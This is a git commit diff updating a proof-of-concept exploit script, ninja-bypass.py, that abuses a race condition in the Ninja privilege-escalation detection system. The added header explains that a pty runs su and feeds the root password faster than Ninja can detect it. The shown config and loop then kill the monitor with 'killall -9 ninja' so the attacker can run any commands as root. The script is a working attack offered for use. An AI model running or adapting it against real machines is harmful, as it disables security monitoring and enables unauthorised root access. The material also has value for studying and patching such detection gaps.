efc3a5dc2d49c275f903ed15032ac4566f0402b3
highjack <gizm0.420@gmail.com>
2015-04-29 08:48:20 +0100

    updating ninja poc

--- ninja-bypass.py
+++ ninja-bypass.py
@@ -1,9 +1,24 @@
+#[Title] Ninja privilege escalation detection and prevention system race condition
+#[Author] Ben 'highjack' Sheppard
+#[URL] http://highjack.github.io/
+#[Description] There is a small delay between the time of execution of a command and the time privelege escalation is detected.
+#It is therefore possible to use a pty to run a command such as su and provide the password faster than it can be detected.
+#The following PoC becomes root using su and issues killall -9 ninja. The attacker can then run any commands that they wish.
+#[Software Link] http://forkbomb.org/ninja/
+#[Date] 29/04/2015
+#[Version] 0.1.3
+#[Tested on] Kali Linux
+#[Demo] https://www.youtube.com/watch?v=P8VJCUUJPLg
+
+#See me hitting every open port, 'cause im banging on their system while I'm staying out of the court
+#https://www.youtube.com/watch?v=eA136fOsSeQ
+
 import pty, os, sys, subprocess
 pid, fd = pty.fork()
 
 #begin config
 user = "root"
-password  = "password"
+password  = "mypassword" #change this :)
 command = "killall -9 ninja"
 #end config
 
@@ -21,7 +36,7 @@ def usage():
 ::   :::   ::   ::: ::::  ::   :::  ::: : ::  ::   :::   ::: :::   ::  :::  
  :   : :  :     :: :: :    :   : :   : :::     :   : :   :: :: :   :   ::: 
  
-[Title] Ninja privilege escalation detection and prevention system race condition
+[Title] Ninja privilege escalation detection and prevention system 0.1.3 race condition
 [Author] Ben 'highjack' Sheppard
 [URL] http://highjack.github.io/
  
@@ -65,5 +80,3 @@ while True:
 	if (check_procs == True):
 		executions = executions + 1
 		kill_ninja()
-
-
